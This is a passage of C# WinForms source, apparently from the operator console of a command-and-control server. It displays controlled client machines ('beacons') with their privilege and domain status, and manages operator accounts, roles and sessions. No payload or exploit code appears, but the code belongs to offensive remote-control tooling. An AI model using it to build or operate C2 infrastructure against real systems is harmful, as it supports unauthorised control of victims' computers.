                var requestMessage = new OperatorMessage
                {
                    Type = OperatorMessageType.Command,
                    From = _operatorUsername,
                    Data = JsonSerializer.Serialize(new Dictionary<string, string>
                    {
                        ["Command"] = "list",
                        ["ClientId"] = ""
                    })
                };

                string requestJson = JsonSerializer.Serialize(requestMessage);
                byte[] requestData = Encoding.UTF8.GetBytes(requestJson);
                await _operatorStream.WriteAsync(requestData, 0, requestData.Length);
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error requesting client list: {ex.Message}", Color.Red);
            }
        }

        private void UpdateClientListFromOperatorData(List<Dictionary<string, object>> clients)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => UpdateClientListFromOperatorData(clients)));
                return;
            }

            try
            {
                // Clear the current list
                lvClients.Items.Clear();

                // Add shared clients to the view
                foreach (var clientData in clients)
                {
                    string clientId = clientData.GetValueOrDefault("ClientId", "Unknown").ToString();
                    string clientInfo = clientData.GetValueOrDefault("ClientInfo", "Unknown").ToString();
                    string userName = clientData.GetValueOrDefault("UserName", "Unknown").ToString();
                    string computerName = clientData.GetValueOrDefault("ComputerName", "Unknown").ToString();
                    bool isAdmin = bool.Parse(clientData.GetValueOrDefault("IsAdmin", "false").ToString());
                    bool isConnected = bool.Parse(clientData.GetValueOrDefault("IsConnected", "false").ToString());
                    bool isEncrypted = bool.Parse(clientData.GetValueOrDefault("IsEncrypted", "false").ToString());
                    string osVersion = clientData.GetValueOrDefault("OSVersion", "Unknown").ToString();

                    // Get domain status from server data
                    bool isDomainJoined = bool.Parse(clientData.GetValueOrDefault("IsDomainJoined", "false").ToString());

                    ListViewItem item = new ListViewItem(clientId);
                    item.Tag = clientId;

                    // Pass all three parameters to formatter
                    string formattedUserName = FormatUsernameForDisplay(userName, isAdmin, isDomainJoined);

                    item.SubItems.Add(clientInfo);
                    item.SubItems.Add(isConnected ? "Active" : "Disconnected");
                    item.SubItems.Add(formattedUserName);
                    item.SubItems.Add(computerName);
                    item.SubItems.Add(isAdmin ? "Yes" : "No");
                    item.SubItems.Add(isEncrypted ? "🔒 TLS" : "🔓 Plain");
                    item.SubItems.Add(osVersion);

                    ApplyUserColorCoding(item, formattedUserName, isAdmin, isEncrypted);

                    if (_operatorActiveClientId == clientId)
                    {
                        item.Font = new Font(lvClients.Font, FontStyle.Bold);
                    }

                    lvClients.Items.Add(item);
                }

                if (_isTopologyView && _topologyViewer != null)
                {
                    UpdateTopologyViewFromOperatorData(clients);
                }
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error updating client list from operator data: {ex.Message}", Color.Red);
            }
        }
        private void UpdateTopologyViewFromOperatorData(List<Dictionary<string, object>> clientsData)
        {
            if (_topologyViewer == null) return;

            try
            {
                var clients = new List<ClientInfo>();

                // Convert operator data to ClientInfo objects
                foreach (var clientData in clientsData)
                {
                    var clientInfo = new ClientInfo
                    {
                        ClientId = clientData.GetValueOrDefault("ClientId", "Unknown").ToString(),
                        ClientInfo_ = clientData.GetValueOrDefault("ClientInfo", "Unknown").ToString(),
                        UserName = clientData.GetValueOrDefault("UserName", "Unknown").ToString(),
                        ComputerName = clientData.GetValueOrDefault("ComputerName", "Unknown").ToString(),
                        IsAdmin = bool.Parse(clientData.GetValueOrDefault("IsAdmin", "false").ToString()),
                        IsConnected = bool.Parse(clientData.GetValueOrDefault("IsConnected", "false").ToString()),
                        IsEncrypted = bool.Parse(clientData.GetValueOrDefault("IsEncrypted", "false").ToString()),
                        OSVersion = clientData.GetValueOrDefault("OSVersion", "Unknown").ToString(),
                        IsDomainJoined = bool.Parse(clientData.GetValueOrDefault("IsDomainJoined", "false").ToString()),
                        IsLinux = bool.Parse(clientData.GetValueOrDefault("IsLinux", "false").ToString()),
                        LastSeen = DateTime.Now
                    };

                    clients.Add(clientInfo);
                }

                // Update the topology viewer
                _topologyViewer.UpdateBeacons(clients);

                // Highlight active beacon if there is one
                if (!string.IsNullOrEmpty(_operatorActiveClientId))
                {
                    _topologyViewer.SetActiveBeacon(_operatorActiveClientId);
                }

            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error updating topology from operator data: {ex.Message}", Color.Red);
            }
        }

        private string FormatUsernameForDisplay(string userName, bool isAdmin, bool isDomainJoined)
        {
            if (string.IsNullOrEmpty(userName) || userName == "Unknown")
                return "Unknown";

            string formattedUserName = userName;

            // Handle SYSTEM accounts
            if (userName.Equals("SYSTEM", StringComparison.OrdinalIgnoreCase) ||
                userName.Contains("NT AUTHORITY\\SYSTEM", StringComparison.OrdinalIgnoreCase) ||
                userName.Contains("NT AUTHORITY", StringComparison.OrdinalIgnoreCase) ||
                userName.EndsWith("$", StringComparison.OrdinalIgnoreCase))
            {
                return "NT AUTHORITY\\SYSTEM";
            }

            // Add admin indicator if not already present
            if (isAdmin && !userName.Contains("(Administrator)"))
            {
                formattedUserName = $"{userName} (Administrator)";
            }

            if (!formattedUserName.Contains("(Local User)") && !formattedUserName.Contains("(Domain User)"))
            {
                if (isDomainJoined)
                {
                    formattedUserName = $"{formattedUserName} (Domain User)";
                }
                else if (!formattedUserName.Contains("SYSTEM"))
                {
                    formattedUserName = $"{formattedUserName} (Local User)";
                }
            }

            return formattedUserName;
        }


        private void ApplyUserColorCoding(ListViewItem item, string formattedUserName, bool isAdmin, bool isEncrypted)
        {
            // User color coding
            if (formattedUserName.Equals("NT AUTHORITY\\SYSTEM", StringComparison.OrdinalIgnoreCase))
            {
                item.ForeColor = Color.FromArgb(255, 0, 0); // Red for SYSTEM
            }
            else if (isAdmin)
            {
                item.ForeColor = Color.FromArgb(220, 0, 0); // Dark red for admin
            }
            else if (formattedUserName.Contains("(Domain User)"))
            {
                item.ForeColor = Color.FromArgb(0, 120, 215); // Blue for domain users
            }
            else
            {
                item.ForeColor = Color.FromArgb(220, 220, 220); // Default color for local users
            }

            // Encryption status color (for the encryption column)
            if (isEncrypted)
            {
                item.SubItems[6].ForeColor = Color.FromArgb(0, 255, 0); // Green for encrypted
            }
            else
            {
                item.SubItems[6].ForeColor = Color.FromArgb(255, 165, 0); // Orange for plain text
            }
        }


        private void AddMultiplayerButtons()
        {
            // Toggle Multiplayer Button
            btnToggleMultiplayer = new Button
            {
                Text = "Enable Multiplayer",
                Location = new Point(680, 10),
                Size = new Size(120, 26),
                Name = "btnToggleMultiplayer",
                TabIndex = 4,
                UseVisualStyleBackColor = true
            };
            StyleButton(btnToggleMultiplayer, Color.FromArgb(220, 53, 69));
            btnToggleMultiplayer.Click += BtnToggleMultiplayer_Click;
            panel2.Controls.Add(btnToggleMultiplayer);

            // Manage Users Button - STORE REFERENCE
            btnManageUsers = new Button
            {
                Text = "Manage Users",
                Location = new Point(810, 10),
                Size = new Size(110, 26),
                Name = "btnManageUsers",
                TabIndex = 5,
                UseVisualStyleBackColor = true
            };
            StyleButton(btnManageUsers, Color.FromArgb(128, 0, 128));
            btnManageUsers.Click += BtnManageUsers_Click;
            panel2.Controls.Add(btnManageUsers);

            // Move existing controls to the right
            cmbOperatorProfiles = new ComboBox
            {
                Location = new Point(930, 10),
                Size = new Size(200, 26),
                Name = "cmbOperatorProfiles",
                TabIndex = 6,
                DropDownStyle = ComboBoxStyle.DropDownList,
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.FromArgb(220, 220, 220),
                Visible = false
            };
            panel2.Controls.Add(cmbOperatorProfiles);

            btnConnectOperator = new Button
            {
                Text = "Connect",
                Location = new Point(1140, 10),
                Size = new Size(80, 26),
                Name = "btnConnectOperator",
                TabIndex = 7,
                UseVisualStyleBackColor = true,
                Enabled = false
            };
            StyleButton(btnConnectOperator, Color.FromArgb(108, 117, 125));
            btnConnectOperator.Click += BtnConnectOperator_Click;
            panel2.Controls.Add(btnConnectOperator);

            btnManageProfiles = new Button
            {
                Text = "Manage",
                Location = new Point(1230, 10),
                Size = new Size(70, 26),
                Name = "btnManageProfiles",
                TabIndex = 8,
                UseVisualStyleBackColor = true,
                Enabled = false
            };
            StyleButton(btnManageProfiles, Color.FromArgb(75, 0, 130));
            btnManageProfiles.Click += BtnManageProfiles_Click;
            panel2.Controls.Add(btnManageProfiles);

            LoadOperatorProfiles();
        }
        private void BtnManageUsers_Click(object sender, EventArgs e)
        {
            ShowUserManagementDialog();
        }


        private void ShowUserManagementDialog()
        {
            Form userMgmtForm = new Form
            {
                Text = "Server User Management",
                Size = new Size(870, 650),
                StartPosition = FormStartPosition.CenterParent,
                BackColor = Color.FromArgb(30, 30, 30),
                ForeColor = Color.FromArgb(220, 220, 220),
                FormBorderStyle = FormBorderStyle.FixedDialog,
                MaximizeBox = false,
                MinimizeBox = false
            };

            // Header
            Label lblHeader = new Label
            {
                Text = "🔐 Server User Management",
                Location = new Point(20, 15),
                Size = new Size(400, 30),
                Font = new Font(this.Font.FontFamily, 14, FontStyle.Bold),
                ForeColor = Color.FromArgb(0, 120, 215)
            };

            Label lblSubtitle = new Label
            {
                Text = "Manage user accounts that can connect to this C2 server as operators",
                Location = new Point(20, 45),
                Size = new Size(600, 20),
                ForeColor = Color.FromArgb(180, 180, 180)
            };

            // Statistics Panel
            Panel statsPanel = new Panel
            {
                Location = new Point(20, 75),
                Size = new Size(850, 40),
                BackColor = Color.FromArgb(45, 45, 48),
                BorderStyle = BorderStyle.FixedSingle
            };

            Label lblStats = new Label
            {
                Location = new Point(10, 10),
                Size = new Size(800, 20),
                ForeColor = Color.FromArgb(220, 220, 220)
            };
            statsPanel.Controls.Add(lblStats);

            // Users ListView
            ListView lvUsers = new ListView
            {
                Location = new Point(20, 125),
                Size = new Size(830, 400),
                View = View.Details,
                FullRowSelect = true,
                GridLines = true,
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.FromArgb(220, 220, 220)
            };

            lvUsers.Columns.Add("Username", 120);
            lvUsers.Columns.Add("Role", 100);
            lvUsers.Columns.Add("Status", 80);
            lvUsers.Columns.Add("Created", 120);
            lvUsers.Columns.Add("Created By", 100);
            lvUsers.Columns.Add("Last Login", 130);
            lvUsers.Columns.Add("Login Count", 80);
            lvUsers.Columns.Add("Online Status", 120);

            Button btnAddUser = new Button
            {
                Text = "➕ Add User",
                Location = new Point(20, 540),
                Size = new Size(120, 35),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(40, 167, 69),
                ForeColor = Color.White
            };

            Button btnEditUser = new Button
            {
                Text = "✏️ Edit User",
                Location = new Point(150, 540),
                Size = new Size(120, 35),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(255, 193, 7),
                ForeColor = Color.Black
            };

            Button btnChangePassword = new Button
            {
                Text = "🔑 Change Password",
                Location = new Point(280, 540),
                Size = new Size(140, 35),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(0, 120, 215),
                ForeColor = Color.White
            };

            Button btnToggleStatus = new Button
            {
                Text = "🔄 Enable/Disable",
                Location = new Point(430, 540),
                Size = new Size(130, 35),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(108, 117, 125),
                ForeColor = Color.White
            };

            Button btnDeleteUser = new Button
            {
                Text = "🗑️ Delete User",
                Location = new Point(570, 540),
                Size = new Size(120, 35),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(220, 53, 69),
                ForeColor = Color.White
            };

            Button btnSessionDetails = new Button
            {
                Text = "📊 Session Details",
                Location = new Point(700, 540),
                Size = new Size(130, 35),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(0, 120, 215),
                ForeColor = Color.White
            };

            Button btnDisconnectUser = new Button
            {
                Text = "⚡ Disconnect",
                Location = new Point(840, 540),
                Size = new Size(110, 35),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(255, 165, 0),
                ForeColor = Color.Black
            };



            // Event Handlers - UPDATED TO INCLUDE SESSION DETAILS
            btnAddUser.Click += (s, e) => ShowAddUserDialog(lvUsers, lblStats);
            btnEditUser.Click += (s, e) => EditSelectedUser(lvUsers, lblStats);
            btnChangePassword.Click += (s, e) => ChangeSelectedUserPassword(lvUsers);
            btnToggleStatus.Click += (s, e) => ToggleSelectedUserStatus(lvUsers, lblStats);
            btnDeleteUser.Click += (s, e) => DeleteSelectedUser(lvUsers, lblStats);
            btnSessionDetails.Click += (s, e) => ShowSessionDetails(lvUsers); // NEW EVENT HANDLER
            btnDisconnectUser.Click += (s, e) => KickSelectedUser(lvUsers, lblStats);

            // Initial data load
            RefreshUserList(lvUsers, lblStats);

            userMgmtForm.Controls.AddRange(new Control[] {
        lblHeader, lblSubtitle, statsPanel, lvUsers,
        btnAddUser, btnEditUser, btnChangePassword, btnToggleStatus,
        btnDeleteUser, btnSessionDetails
    });

            userMgmtForm.ShowDialog();
        }


        private void ShowSessionDetails(ListView lvUsers)
        {
            if (lvUsers.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a user to view session details.", "No Selection", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            var user = (OperatorCredential)lvUsers.SelectedItems[0].Tag;

            // Check if user is online
            ConnectedOperator connectedOp = null;
            if (_server != null)
            {
                var connectedOps = _server.GetConnectedOperators();
                connectedOp = connectedOps?.FirstOrDefault(op => op.Username == user.Username && op.IsAuthenticated);
            }

            string sessionInfo;
            if (connectedOp == null)
            {
                sessionInfo = $"📋 Session Details: {user.Username}\n" +
                             $"{'=' * 50}\n\n" +
                             "🔴 Current Status: OFFLINE\n\n" +
                             "📊 Account Information:\n" +
                             $"   • Role: {user.Role}\n" +
                             $"   • Account Status: {(user.Enabled ? "✅ Enabled" : "❌ Disabled")}\n" +
                             $"   • Created: {user.CreatedAt:yyyy-MM-dd HH:mm:ss}\n" +
                             $"   • Created By: {user.CreatedBy ?? "Unknown"}\n\n" +
                             "📈 Login Statistics:\n" +
                             $"   • Total Logins: {user.LoginCount}\n" +
                             $"   • Last Login: {(user.LastLogin == DateTime.MinValue ? "Never" : user.LastLogin.ToString("yyyy-MM-dd HH:mm:ss"))}\n" +
                             $"   • Days Since Last Login: {(user.LastLogin == DateTime.MinValue ? "N/A" : (DateTime.Now - user.LastLogin).Days.ToString())}\n\n" +
                             "🔒 Security Notes:\n" +
                             "   • No active sessions\n" +
                             "   • Account available for login";
            }
            else
            {
                var sessionDuration = DateTime.Now - connectedOp.ConnectedAt;
                string durationFormatted = sessionDuration.TotalDays >= 1 ?
                    $"{(int)sessionDuration.TotalDays}d {sessionDuration.Hours}h {sessionDuration.Minutes}m" :
                    sessionDuration.TotalHours >= 1 ?
                    $"{(int)sessionDuration.TotalHours}h {sessionDuration.Minutes}m" :
                    $"{(int)sessionDuration.TotalMinutes}m {sessionDuration.Seconds}s";

                sessionInfo = $"📋 Session Details: {user.Username}\n" +
                             $"{'=' * 50}\n\n" +
                             "🟢 Current Status: ONLINE (ACTIVE SESSION)\n\n" +
                             "🌐 Connection Information:\n" +
                             $"   • Remote IP: {connectedOp.RemoteEndPoint?.Address}\n" +
                             $"   • Remote Port: {connectedOp.RemoteEndPoint?.Port}\n" +
                             $"   • Connection Type: {(connectedOp.IsEncrypted ? "🔒 Encrypted (TLS)" : "🔓 Plain Text")}\n" +
                             $"   • Connected At: {connectedOp.ConnectedAt:yyyy-MM-dd HH:mm:ss}\n" +
                             $"   • Session Duration: {durationFormatted}\n" +
                             $"   • Last Activity: {connectedOp.LastActivity:yyyy-MM-dd HH:mm:ss}\n\n" +
                             "👤 Session Details:\n" +
                             $"   • Role: {connectedOp.Role}\n" +
                             $"   • Operator ID: {connectedOp.OperatorId}\n" +
                             $"   • Active Client: {(string.IsNullOrEmpty(connectedOp.ActiveClientId) ? "None" : connectedOp.ActiveClientId)}\n" +
                             $"   • Session Status: {(connectedOp.IsAlive ? "✅ Alive" : "❌ Dead")}\n\n" +
                             "📊 Account Information:\n" +
                             $"   • Account Status: {(user.Enabled ? "✅ Enabled" : "❌ Disabled")}\n" +
                             $"   • Created: {user.CreatedAt:yyyy-MM-dd HH:mm:ss}\n" +
                             $"   • Created By: {user.CreatedBy ?? "Unknown"}\n\n" +
                             "📈 Login Statistics:\n" +
                             $"   • Total Logins: {user.LoginCount}\n" +
                             $"   • Previous Login: {(user.LastLogin == DateTime.MinValue ? "This is first login" : user.LastLogin.ToString("yyyy-MM-dd HH:mm:ss"))}\n\n" +
                             "🔒 Security Status:\n" +
                             "   • ⚠️  Account currently in use\n" +
                             "   • 🚫 New logins will be rejected\n" +
                             "   • 🛡️  Single session policy enforced";
            }

            // Create a custom form for better display
            Form detailsForm = new Form
            {
                Text = $"Session Details - {user.Username}",
                Size = new Size(600, 700),
                StartPosition = FormStartPosition.CenterParent,
                BackColor = Color.FromArgb(30, 30, 30),
                ForeColor = Color.FromArgb(220, 220, 220),
                FormBorderStyle = FormBorderStyle.FixedDialog,
                MaximizeBox = false,
                MinimizeBox = false
            };

            TextBox txtDetails = new TextBox
            {
                Location = new Point(20, 20),
                Size = new Size(540, 580),
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.FromArgb(220, 220, 220),
                Font = new Font("Consolas", 9),
                Multiline = true,
                ReadOnly = true,
                ScrollBars = ScrollBars.Vertical,
                Text = sessionInfo
            };

            Button btnRefresh = new Button
            {
                Text = "🔄 Refresh",
                Location = new Point(20, 620),
                Size = new Size(100, 30),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(0, 120, 215),
                ForeColor = Color.White
            };

            Button btnCloseDetails = new Button
            {
                Text = "Close",
                Location = new Point(480, 620),
                Size = new Size(80, 30),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(108, 117, 125),
                ForeColor = Color.White
            };

            if (connectedOp != null)
            {
                Button btnDisconnectFromDetails = new Button
                {
                    Text = "⚡ Disconnect User",
                    Location = new Point(320, 620),
                    Size = new Size(140, 30),
                    FlatStyle = FlatStyle.Flat,
                    BackColor = Color.FromArgb(220, 53, 69),
                    ForeColor = Color.White
                };

                btnDisconnectFromDetails.Click += (s, e) =>
                {
                    var result = MessageBox.Show(
                        $"Are you sure you want to disconnect '{user.Username}'?",
                        "Confirm Disconnect",
                        MessageBoxButtons.YesNo,
                        MessageBoxIcon.Warning);

                    if (result == DialogResult.Yes)
                    {
                        try
                        {
                            _server.ForceDisconnectUser(user.Username, "Disconnected from session details by administrator");
                            LogMessage($"[*] User '{user.Username}' disconnected from session details", Color.Yellow);
                            detailsForm.Close();
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show($"Error disconnecting user: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                };

                detailsForm.Controls.Add(btnDisconnectFromDetails);
            }

            btnRefresh.Click += (s, e) =>
            {
                // Refresh the session details by closing and reopening
                detailsForm.Close();
                ShowSessionDetails(lvUsers);
            };

            btnCloseDetails.Click += (s, e) => detailsForm.Close();

            detailsForm.Controls.AddRange(new Control[] { txtDetails, btnRefresh, btnCloseDetails });
            detailsForm.ShowDialog();
        }

        private void RefreshUserList(ListView lvUsers, Label lblStats)
        {
            lvUsers.Items.Clear();

            try
            {
                var users = OperatorConfigManager.GetAllOperators();
                int totalUsers = users.Count;
                int enabledUsers = users.Count(u => u.Enabled);
                int onlineUsers = 0;
                int operatorCount = users.Count(u => u.Role == "Operator");
                int observerCount = users.Count(u => u.Role == "Observer");

                foreach (var user in users.OrderBy(u => u.Username))
                {
                    var item = new ListViewItem(user.Username);

                    // Role with emoji
                    string roleDisplay = user.Role == "Observer" ? "👁️ Observer" : "⚡ Operator";
                    item.SubItems.Add(roleDisplay);

                    // Status with session info
                    string statusDisplay = user.Enabled ? "✅ Enabled" : "❌ Disabled";

                    // Enhanced online status - check via server's method
                    bool isOnline = false;
                    ConnectedOperator connectedOp = null;
                    if (_server != null)
                    {
                        var connectedOps = _server.GetConnectedOperators();
                        connectedOp = connectedOps?.FirstOrDefault(op => op.Username == user.Username && op.IsAuthenticated);
                        isOnline = connectedOp != null;
                    }

                    if (isOnline)
                    {
                        onlineUsers++;
                        statusDisplay += " (🟢 Online)";
                    }

                    item.SubItems.Add(statusDisplay);

                    // Created date
                    item.SubItems.Add(user.CreatedAt.ToString("yyyy-MM-dd HH:mm"));

                    // Created by
                    item.SubItems.Add(user.CreatedBy ?? "Unknown");

                    // Last login with more detail
                    string lastLogin = user.LastLogin == DateTime.MinValue ? "Never" : user.LastLogin.ToString("yyyy-MM-dd HH:mm");
                    if (isOnline && connectedOp != null)
                    {
                        var sessionDuration = DateTime.Now - connectedOp.ConnectedAt;
                        lastLogin += $" (Current: {sessionDuration.TotalMinutes:F0}m)";
                    }
                    item.SubItems.Add(lastLogin);

                    // Login count
                    item.SubItems.Add(user.LoginCount.ToString());

                    // Enhanced online status with connection details
                    string onlineStatus = "🔴 Offline";
                    if (isOnline && connectedOp != null)
                    {
                        onlineStatus = $"🟢 Online from {connectedOp.RemoteEndPoint?.Address}";
                        if (!string.IsNullOrEmpty(connectedOp.ActiveClientId))
                        {
                            onlineStatus += $" (Controlling: {connectedOp.ActiveClientId})";
                        }
                    }
                    item.SubItems.Add(onlineStatus);

                    item.Tag = user;

                    // Enhanced visual styling
                    if (!user.Enabled)
                    {
                        item.ForeColor = Color.Gray;
                    }
                    else if (isOnline)
                    {
                        item.BackColor = Color.FromArgb(0, 60, 0);
                        item.Font = new Font(lvUsers.Font, FontStyle.Bold); // Bold for online users
                    }

                    if (user.Role == "Observer")
                    {
                        item.SubItems[1].ForeColor = Color.Orange;
                    }
                    else
                    {
                        item.SubItems[1].ForeColor = Color.LightBlue;
                    }

                    lvUsers.Items.Add(item);
                }

                lblStats.Text = $"📊 Total: {totalUsers} users | ✅ Enabled: {enabledUsers} | 🟢 Online: {onlineUsers} | ⚡ Operators: {operatorCount} | 👁️ Observers: {observerCount}";

                if (onlineUsers > 0)
                {
                    lblStats.Text += $" | 📱 Active Sessions: {onlineUsers}";
                }
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error refreshing user list: {ex.Message}", Color.Red);
                lblStats.Text = "❌ Error loading user data";
            }
        }

        private void ShowAddUserDialog(ListView lvUsers, Label lblStats)
        {
            ShowUserEditDialog(null, lvUsers, lblStats, "Add New User");
        }

        private void EditSelectedUser(ListView lvUsers, Label lblStats)
        {
            if (lvUsers.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a user to edit.", "No Selection", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            var user = (OperatorCredential)lvUsers.SelectedItems[0].Tag;
            ShowUserEditDialog(user, lvUsers, lblStats, $"Edit User - {user.Username}");
        }

        private void ShowUserEditDialog(OperatorCredential editUser, ListView lvUsers, Label lblStats, string title)
        {
            Form editForm = new Form
            {
                Text = title,
                Size = new Size(450, 350),
                StartPosition = FormStartPosition.CenterParent,
                BackColor = Color.FromArgb(30, 30, 30),
                ForeColor = Color.FromArgb(220, 220, 220),
                FormBorderStyle = FormBorderStyle.FixedDialog,
                MaximizeBox = false,
                MinimizeBox = false
            };

            bool isEdit = editUser != null;

            // Username
            Label lblUsername = new Label { Text = "Username:", Location = new Point(20, 20), AutoSize = true };
            TextBox txtUsername = new TextBox
            {
                Location = new Point(120, 17),
                Size = new Size(250, 23),
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.FromArgb(220, 220, 220),
                Text = editUser?.Username ?? "",
                Enabled = !isEdit
            };

            // Password (only for new users)
            Label lblPassword = new Label { Text = "Password:", Location = new Point(20, 55), AutoSize = true, Visible = !isEdit };
            TextBox txtPassword = new TextBox
            {
                Location = new Point(120, 52),
                Size = new Size(250, 23),
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.FromArgb(220, 220, 220),
                UseSystemPasswordChar = true,
                Visible = !isEdit
            };

            // Role
            Label lblRole = new Label { Text = "Role:", Location = new Point(20, isEdit ? 55 : 90), AutoSize = true };
            ComboBox cmbRole = new ComboBox
            {
                Location = new Point(120, isEdit ? 52 : 87),
                Size = new Size(150, 23),
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.FromArgb(220, 220, 220),
                DropDownStyle = ComboBoxStyle.DropDownList
            };
            cmbRole.Items.AddRange(new[] { "Operator", "Observer" });
            cmbRole.SelectedIndex = (editUser?.Role == "Observer") ? 1 : 0;

            // Enabled status
            CheckBox chkEnabled = new CheckBox
            {
                Text = "Account Enabled",
                Location = new Point(120, isEdit ? 90 : 125),
                AutoSize = true,
                ForeColor = Color.FromArgb(220, 220, 220),
                Checked = editUser?.Enabled ?? true
            };

            // Role description
            Label lblRoleDesc = new Label
            {
                Text = "⚡ Operator: Full control | 👁️ Observer: View only",
                Location = new Point(120, isEdit ? 125 : 160),
                Size = new Size(300, 30),
                ForeColor = Color.FromArgb(150, 150, 150),
                Font = new Font(editForm.Font.FontFamily, 8)
            };

            // Info for edit mode
            if (isEdit)
            {
                Label lblEditInfo = new Label
                {
                    Text = $"Created: {editUser.CreatedAt:yyyy-MM-dd HH:mm} by {editUser.CreatedBy}\nLast Login: {(editUser.LastLogin == DateTime.MinValue ? "Never" : editUser.LastLogin.ToString("yyyy-MM-dd HH:mm"))}\nLogin Count: {editUser.LoginCount}",
                    Location = new Point(20, 160),
                    Size = new Size(350, 60),
                    ForeColor = Color.FromArgb(150, 150, 150),
                    Font = new Font(editForm.Font.FontFamily, 8)
                };
                editForm.Controls.Add(lblEditInfo);
            }

            // Buttons
            Button btnSave = new Button
            {
                Text = isEdit ? "Update" : "Create",
                Location = new Point(120, isEdit ? 240 : 220),
                Size = new Size(80, 30),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(40, 167, 69),
                ForeColor = Color.White
            };

            Button btnCancel = new Button
            {
                Text = "Cancel",
                Location = new Point(210, isEdit ? 240 : 220),
                Size = new Size(80, 30),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(108, 117, 125),
                ForeColor = Color.White
            };

            btnSave.Click += (s, e) =>
            {
                try
                {
                    if (!isEdit)
                    {
                        // Validate new user
                        if (string.IsNullOrWhiteSpace(txtUsername.Text))
                        {
                            MessageBox.Show("Username is required.", "Validation Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            return;
                        }

                        if (string.IsNullOrWhiteSpace(txtPassword.Text))
                        {
                            MessageBox.Show("Password is required.", "Validation Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            return;
                        }

                        OperatorConfigManager.AddOperator(txtUsername.Text.Trim(), txtPassword.Text, cmbRole.SelectedItem.ToString(), chkEnabled.Checked, "Admin");
                        LogMessage($"[+] User '{txtUsername.Text.Trim()}' created successfully", Color.Green);
                    }
                    else
                    {
                        // Update existing user
                        OperatorConfigManager.UpdateOperator(editUser.Username, null, cmbRole.SelectedItem.ToString(), chkEnabled.Checked);
                        LogMessage($"[*] User '{editUser.Username}' updated successfully", Color.Green);
                    }

                    RefreshUserList(lvUsers, lblStats);
                    editForm.Close();
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error saving user: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            };

            btnCancel.Click += (s, e) => editForm.Close();

            // Add controls
            editForm.Controls.AddRange(new Control[] {
        lblUsername, txtUsername, lblPassword, txtPassword, lblRole, cmbRole,
        chkEnabled, lblRoleDesc, btnSave, btnCancel
    });

            editForm.ShowDialog();
        }

        private void ChangeSelectedUserPassword(ListView lvUsers)
        {
            if (lvUsers.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a user to change password.", "No Selection", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            var user = (OperatorCredential)lvUsers.SelectedItems[0].Tag;

            Form passwordForm = new Form
            {
                Text = $"Change Password - {user.Username}",
                Size = new Size(400, 250),
                StartPosition = FormStartPosition.CenterParent,
                BackColor = Color.FromArgb(30, 30, 30),
                ForeColor = Color.FromArgb(220, 220, 220),
                FormBorderStyle = FormBorderStyle.FixedDialog,
                MaximizeBox = false,
                MinimizeBox = false
            };

            Label lblNewPassword = new Label { Text = "New Password:", Location = new Point(20, 30), AutoSize = true };
            TextBox txtNewPassword = new TextBox
            {
                Location = new Point(120, 27),
                Size = new Size(200, 23),
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.FromArgb(220, 220, 220),
                UseSystemPasswordChar = true
            };

            Label lblConfirmPassword = new Label { Text = "Confirm:", Location = new Point(20, 65), AutoSize = true };
            TextBox txtConfirmPassword = new TextBox
            {
                Location = new Point(120, 62),
                Size = new Size(200, 23),
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.FromArgb(220, 220, 220),
                UseSystemPasswordChar = true
            };

            CheckBox chkShowPassword = new CheckBox
            {
                Text = "Show passwords",
                Location = new Point(120, 95),
                AutoSize = true,
                ForeColor = Color.FromArgb(220, 220, 220)
            };

            chkShowPassword.CheckedChanged += (s, e) =>
            {
                txtNewPassword.UseSystemPasswordChar = !chkShowPassword.Checked;
                txtConfirmPassword.UseSystemPasswordChar = !chkShowPassword.Checked;
            };

            Button btnChangePassword = new Button
            {
                Text = "Change Password",
                Location = new Point(120, 130),
                Size = new Size(120, 30),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(0, 120, 215),
                ForeColor = Color.White
            };

            Button btnCancel = new Button
            {
                Text = "Cancel",
                Location = new Point(250, 130),
                Size = new Size(70, 30),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(108, 117, 125),
                ForeColor = Color.White
            };

            btnChangePassword.Click += (s, e) =>
            {
                if (string.IsNullOrWhiteSpace(txtNewPassword.Text))
                {
                    MessageBox.Show("Password cannot be empty.", "Validation Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                if (txtNewPassword.Text != txtConfirmPassword.Text)
                {
